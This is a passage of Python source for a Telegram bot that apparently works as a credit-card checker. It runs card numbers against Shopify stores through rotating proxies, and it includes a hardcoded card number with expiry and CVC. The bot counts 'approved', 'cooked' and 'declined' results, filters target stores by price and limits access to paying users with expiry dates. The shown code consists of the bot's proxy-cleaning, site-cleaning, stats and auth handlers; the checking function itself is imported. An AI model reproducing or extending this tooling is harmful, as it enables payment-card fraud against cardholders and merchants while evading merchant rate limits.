                    'CONNECTION REFUSED', 'MAX RETRIES', 'HOST UNREACHABLE'
                ]

                is_valid = any(k in response_upper for k in valid_keywords)
                is_dead = any(k in response_upper for k in dead_keywords)

                if is_valid and not is_dead:
                    # Update site info with fresh data
                    site_obj['last_response'] = response_str[:20]
                    site_obj['gateway'] = gateway_found
                    valid_sites.append(site_obj)
            
            except Exception as e:
                print(f"⚠️ Error checking site {site_obj.get('url')}: {e}")

            # Small sleep to prevent flood
            time.sleep(0.5)
        
        # === SAVE RESULTS ===
        sites_data['sites'] = valid_sites
        save_json(SITES_FILE, sites_data)
        
        removed = total_sites - len(valid_sites)
        
        bot.edit_message_text(
            f"✅ **Site Cleaning Finished!**\n\n"
            f"🗑 Removed: {removed}\n"
            f"💎 Active Sites: {len(valid_sites)}",
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            parse_mode='Markdown'
        )

    except Exception as e:
        bot.reply_to(message, f"❌ Critical Error: {e}")
        traceback.print_exc()

@bot.message_handler(commands=['cleanpro'])
def handle_clean_proxies(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return
    
    # Run in a separate thread to avoid blocking
    thread = threading.Thread(target=process_clean_proxies, args=(message,))
    thread.start()

def process_clean_proxies(message):
    # Send initial message
    total_proxies = len(proxies_data['proxies'])
    status_msg = bot.reply_to(message, f"🔍 Cleaning {total_proxies} proxies...\n\nChecked: 0/{total_proxies}\nValid: 0\nInvalid: 0")
    
    # Test all proxies and remove invalid ones
    valid_proxies = []
    test_cc = "5242430428405662|03|28|323"
    
    # Ensure we have a site to test with
    if not sites_data['sites']:
        bot.edit_message_text("❌ No sites available. Add sites first using /addurls", message.chat.id, status_msg.message_id)
        return

    site_obj = random.choice(sites_data['sites'])
    
    for i, proxy in enumerate(proxies_data['proxies']):
        # Update status every 5 proxies to avoid flood limits
        if i % 5 == 0:
            try:
                bot.edit_message_text(
                    f"🔍 Cleaning {total_proxies} proxies...\n\nChecking: {proxy.split(':')[0]}\nChecked: {i}/{total_proxies}\nValid: {len(valid_proxies)}\nDead: {i - len(valid_proxies)}",
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id
                )
            except:
                pass
        
        try:
            # CALL THE CHECKER
            response = check_site_shopify_direct(site_obj['url'], test_cc, proxy)
            
            # ✅ SAFE RESPONSE PARSING (Fixes the Tuple Crash)
            response_text = ""
            if isinstance(response, dict):
                # Check 'Response' (Capital) and 'message' (Lower) just in case
                response_text = response.get("Response", "") + " " + response.get("message", "")
            elif isinstance(response, tuple):
                # If it returns a tuple like (msg, status, gateway), join it to a string
                response_text = " ".join(str(x) for x in response)
            elif isinstance(response, str):
                response_text = response
            
            response_upper = response_text.upper()
            
            # CHECK FOR VALID KEYWORDS
            # We look for ANY response that indicates the proxy successfully reached the gateway
            valid_keywords = [
                'CARD_DECLINED', '3D', 'THANK YOU', 'EXPIRED_CARD', 
                'EXPIRE_CARD', 'EXPIRED', 'INSUFFICIENT_FUNDS', 
                'INCORRECT_CVC', 'INCORRECT_ZIP', 'FRAUD_SUSPECTED', 
                'INCORRECT_NUMBER', 'INVALID_TOKEN', 'AUTHENTICATION_ERROR',
                'DECLINED', 'APPROVED' 
            ]
            
            if any(x in response_upper for x in valid_keywords):
                valid_proxies.append(proxy)
            else:
                # Debug print to console if you want to see why it failed
                print(f"Proxy {proxy} failed. Response: {response_text}")

        except Exception as e:
            print(f"Error checking proxy {proxy}: {e}")
            
        # Small delay to avoid rate limiting
        time.sleep(0.5)
    
    # SAVE RESULTS
    proxies_data['proxies'] = valid_proxies
    save_json(PROXIES_FILE, proxies_data)
    
    # Final update
    removed_count = total_proxies - len(valid_proxies)
    bot.edit_message_text(
        f"✅ Proxy cleaning completed!\n\nRemoved: {removed_count} Dead/Bad Proxies\nTotal Live: {len(valid_proxies)}",
        chat_id=message.chat.id,
        message_id=status_msg.message_id
    )
@bot.message_handler(commands=['rmsites'])
def handle_remove_sites(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return
    
    count = len(sites_data['sites'])
    sites_data['sites'] = []
    save_json(SITES_FILE, sites_data)
    bot.reply_to(message, f"✅ All {count} sites removed.")

@bot.message_handler(commands=['rmpro'])
def handle_remove_proxies(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return
    
    count = len(proxies_data['proxies'])
    proxies_data['proxies'] = []
    save_json(PROXIES_FILE, proxies_data)
    bot.reply_to(message, f"✅ All {count} proxies removed.")

@bot.message_handler(commands=['stats'])
def handle_stats(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return

    # Calculate uptime
    uptime_seconds = int(time.time() - BOT_START_TIME)
    uptime_days = uptime_seconds // (24 * 3600)
    uptime_seconds %= (24 * 3600)
    uptime_hours = uptime_seconds // 3600
    uptime_seconds %= 3600
    uptime_minutes = uptime_seconds // 60
    uptime_seconds %= 60
    
    uptime_str = f"{uptime_days}d {uptime_hours}h {uptime_minutes}m {uptime_seconds}s"

    stats_msg = f"""
┏━━━━━━━⍟
┃ <strong>📊 𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐢𝐬𝐭𝐢𝐜𝐬</strong> 📈
┗━━━━━━━━━━━⊛

[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐒𝐢𝐭𝐞𝐬</strong> ↣ <code>{len(sites_data['sites'])}</code>
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐏𝐫𝐨𝐱𝐢𝐞𝐬</strong> ↣ <code>{len(proxies_data['proxies'])}</code>
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐔𝐩𝐭𝐢𝐦𝐞</strong> ↣ <code>{uptime_str}</code>
━━━━━━━━━━━━━━━━━━━
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅</strong> ↣ <code>{stats_data['approved']}</code>
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐂𝐨𝐨𝐤𝐞𝐝 🔥</strong> ↣ <code>{stats_data['cooked']}</code>
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐃𝐞𝐜𝐜𝐥𝐢𝐧𝐞𝐓 ❌</strong> ↣ <code>{stats_data['declined']}</code>
━━━━━━━━━━━━━━━━━━━
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐌𝐚𝐬𝐬 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅</strong> ↣ <code>{stats_data['mass_approved']}</code>
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐌𝐎𝐬𝐬 𝐂𝐨𝐨𝐤𝐞𝐝 🔥</strong> ↣ <code>{stats_data['mass_cooked']}</code>
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐌𝐚𝐬𝐬 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌</strong> ↣ <code>{stats_data['mass_declined']}</code>
━━━━━━━━━━━━━━━━━━━
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐞𝐜𝐤𝐬</strong> ↣ <code>{stats_data['approved'] + stats_data['cooked'] + stats_data['declined'] + stats_data['mass_approved'] + stats_data['mass_cooked'] + stats_data['mass_declined']}</code>
━━━━━━━━━━━━━━━━━━━
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐁𝐨𝐭 𝐁𝐲</strong> ↣ <a href="tg://user?id={DARKS_ID}">⏤‌‌Unknownop ꯭𖠌</a>
"""

    bot.reply_to(message, stats_msg, parse_mode="HTML")

@bot.message_handler(commands=['viewsites'])
def handle_view_sites(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return
    
    if not sites_data['sites']:
        bot.reply_to(message, "No sites available.")
        return
    
    # Header
    sites_list = """

<strong>🌐 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐒𝐢𝐭𝐞𝐬</strong> 🔥

"""

    # Table header
    sites_list += "━━━━━━━━━━━━━━━━━━━\n"
    sites_list += "<strong>𝐒𝐢𝐭𝐞</strong> ↣          <strong>𝐏𝐫𝐢𝐜𝐞</strong> ↣             <strong>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞𝐬</strong>\n"
    sites_list += "━━━━━━━━━━━━━━━━━━━\n"
    
    # List sites
    for i, site in enumerate(sites_data['sites'][:20]):  # Show first 20 sites
        url_short = site['url'][:20] + "..." if len(site['url']) > 20 else site['url']
        price = site.get('price', '0.00')
        response = site.get('last_response', 'Unknown')
        response_short = response[:15] + "..." if response and len(response) > 15 else response

        sites_list += f"🔹 <code>{url_short}</code> ↣ 💲<strong>{price}</strong> ↣ <code>{response_short}</code>\n"

    # More sites note
    if len(sites_data['sites']) > 20:
        sites_list += f"\n...and <strong>{len(sites_data['sites']) - 20}</strong> more sites ⚡"

    sites_list += "\n━━━━━━━━━━━━━━━━━━━\n"
    sites_list += f"[<a href='https://t.me/Nova_bot_update'>⌬</a>] <strong>𝐁𝐨𝐭 𝐁𝐲</strong> ↣ <a href='tg://user?id={DARKS_ID}'>⏤‌‌Unknownop ꯭𖠌</a>"

    bot.reply_to(message, sites_list, parse_mode="HTML")

@bot.message_handler(commands=['ping'])
def handle_ping(message):
    start_time = time.time()
    ping_msg = bot.reply_to(message, "<strong>🏓 Pong! Checking response time...</strong>", parse_mode="HTML")
    end_time = time.time()
    response_time = round((end_time - start_time) * 1000, 2)
    
    # Calculate uptime
    uptime_seconds = int(time.time() - BOT_START_TIME)
    uptime_days = uptime_seconds // (24 * 3600)
    uptime_seconds %= (24 * 3600)
    uptime_hours = uptime_seconds // 3600
    uptime_seconds %= 3600
    uptime_minutes = uptime_seconds // 60
    uptime_seconds %= 60
    
    uptime_str = f"{uptime_days}d {uptime_hours}h {uptime_minutes}m {uptime_seconds}s"
    
    bot.edit_message_text(
        f"<strong>🏓 Pong!</strong>\n\n"
        f"<strong>Response Time:</strong> {response_time} ms\n"
        f"<strong>Uptime:</strong> {uptime_str}\n\n"
        f"<strong>Bot By:</strong> <a href='tg://user?id={DARKS_ID}'>⏤Unknownop ꯭𖠌</a>",
        chat_id=message.chat.id,
        message_id=ping_msg.message_id,
        parse_mode="HTML"
    )


@bot.message_handler(commands=['restart'])
def handle_restart(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return
    
    restart_msg = bot.reply_to(message, "<strong>🔄 Restarting bot, please wait...</strong>", parse_mode="HTML")
    
    # Simulate restart process
    time.sleep(2)
    
    # Calculate uptime before restart
    uptime_seconds = int(time.time() - BOT_START_TIME)
    uptime_days = uptime_seconds // (24 * 3600)
    uptime_seconds %= (24 * 3600)
    uptime_hours = uptime_seconds // 3600
    uptime_seconds %= 3600
    uptime_minutes = uptime_seconds // 60
    uptime_seconds %= 60
    
    uptime_str = f"{uptime_days}d {uptime_hours}h {uptime_minutes}m {uptime_seconds}s"
    
    # Update the global start time without using global keyword
    # Since BOT_START_TIME is defined at module level, we can modify it directly
    # by using the global namespace
    globals()['BOT_START_TIME'] = time.time()
    
    bot.edit_message_text(
        f"<strong>✅ Bot restarted successfully!</strong>\n\n"
        f"<strong>Previous Uptime:</strong> {uptime_str}\n"
        f"<strong>Restart Time:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        f"<strong>Bot By:</strong> <a href='tg://user?id={DARKS_ID}'>⏤Unknownop ꯭𖠌</a>",
        chat_id=message.chat.id,
        message_id=restart_msg.message_id,
        parse_mode="HTML"
    )

@bot.message_handler(commands=['setamo'])
def handle_set_amount(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return
    
    # Get unique price ranges from sites
    prices = set()
    for site in sites_data['sites']:
        try:
            price = float(site.get('price', 0))
            if price > 0:
                # Round to nearest 5 for grouping
                rounded_price = ((price // 5) + 1) * 5
                prices.add(rounded_price)
        except:
            continue
    
    # Create price options
    price_options = [5, 10, 20, 30, 50, 100]
    
    # Add available prices that are not in standard options
    for price in sorted(prices):
        if price <= 100 and price not in price_options:
            price_options.append(price)
    
    # Sort and ensure we have reasonable options
    price_options = sorted(price_options)
    price_options = [p for p in price_options if p <= 100][:8]  # Limit to 8 options
    
    # Create inline keyboard
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    # Add price buttons
    for price in price_options:
        markup.add(types.InlineKeyboardButton(f"BELOW {price}$", callback_data=f"set_price_{price}"))
    
    # Add "No Filter" and "Cancel" buttons
    markup.add(types.InlineKeyboardButton("❌ No Filter (All Sites)", callback_data="set_price_none"))
    markup.add(types.InlineKeyboardButton("🚫 Cancel", callback_data="set_price_cancel"))
    
    # Get current filter status
    current_filter = price_filter if price_filter else "No Filter"
    
    bot.send_message(
        message.chat.id,
        f"<strong>💰 Set Price Filter</strong>\n\n"
        f"<strong>Current Filter:</strong> {current_filter}$\n"
        f"<strong>Available Sites:</strong> {len(sites_data['sites'])}\n\n"
        f"Select a price range to filter sites:",
        parse_mode="HTML",
        reply_markup=markup
    )

# ============================================================================
# 📂 FILE HANDLING HELPER FUNCTIONS
# ============================================================================

@bot.callback_query_handler(func=lambda call: call.data.startswith('set_price_'))
def handle_price_callback(call):
    global price_filter
    
    if call.data == "set_price_cancel":
        bot.edit_message_text(
            "Price filter setting cancelled.",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id
        )
        return
    
    if call.data == "set_price_none":
        price_filter = None
        settings_data['price_filter'] = None
        save_json(SETTINGS_FILE, settings_data)
        
        bot.edit_message_text(
            f"✅ Price filter removed! All {len(sites_data['sites'])} sites will be used for checking.",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id
        )
        return
    
    # Extract price from callback data
    price_value = call.data.replace('set_price_', '')
    
    try:
        price_filter = float(price_value)
        settings_data['price_filter'] = price_filter
        save_json(SETTINGS_FILE, settings_data)
        
        # Count sites that match the filter
        filtered_sites = [site for site in sites_data['sites'] if float(site.get('price', 0)) <= price_filter]
        
        bot.edit_message_text(
            f"✅ Price filter set to <strong>BELOW {price_filter}$</strong>\n\n"
            f"<strong>Available Sites:</strong> {len(filtered_sites)}/{len(sites_data['sites'])}\n"
            f"<strong>Filter Applied:</strong> Only sites with price ≤ {price_filter}$ will be used.",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode="HTML"
        )
    except ValueError:
        bot.answer_callback_query(call.id, "Invalid price value!")
def is_user_allowed(userid):
    """Complete handler auth - owners + approved users"""
    if userid in OWNER_ID:  # ← YOUR OWNER LIST
        return True
    
    try:
        userdata = users_data.get(str(userid))
        if not userdata:
            return False
        expiry_date_str = userdata.get('expiry_date')
        if not expiry_date_str:
            return False
        expiry_date = datetime.fromisoformat(expiry_date_str)
        return datetime.now() <= expiry_date
    except:
        return False

def get_filtered_sites():
    """Returns LIST of sites (works with your array format)"""
    if isinstance(sites_data, list):
        sites_list = sites_data
    elif isinstance(sites_data, dict) and 'sites' in sites_data:
        sites_list = sites_data['sites']
    else:
        sites_list = []
    
    if price_filter is None:
        return sites_list
    return [s for s in sites_list if float(s.get('price', 999)) <= price_filter]


setup_complete_handler(
    bot,
    get_filtered_sites,
    proxies_data,
    check_site_shopify_direct,
    is_valid_response,
    process_response_shopify,
    update_stats,
    save_json,
    is_user_allowed
)

def is_valid_response(api_response):
    """
    Simple validation - check if response exists and has required fields
    """
    if not api_response:
        return False
    
    if not isinstance(api_response, dict):
        return False
    
    # Must have status field
    if 'status' not in api_response:
        return False
    
    return True

# Ensure this line exists and loads the file
users_data = load_json(USERS_FILE, {}) 

# Debug Print (Optional: Add this right after loading to verify)
print(f"✅ Loaded {len(users_data)} allowed users.")

if __name__ == "__main__":
    import time
    
    # 1. Start the Flask Keep-Alive server first
    keep_alive()  
    
    print("🚀 Bot started...")
    
    # 2. Then start the infinite loop for the bot
    while True:
        try:
            print("📡 Connecting to Telegram API...")
            # Added allowed_updates to ensure you get callback queries
            bot.infinity_polling(
                timeout=60, 
                long_polling_timeout=60, 
                allowed_updates=['message', 'document', 'callback_query'], 
                skip_pending=True
            )
        except KeyboardInterrupt:
            print("\n✅ Bot stopped by user")
            break
        except Exception as e:
            print(f"\n❌ Error: {e}")
            print("⏳ Reconnecting in 10 seconds...")
            time.sleep(10)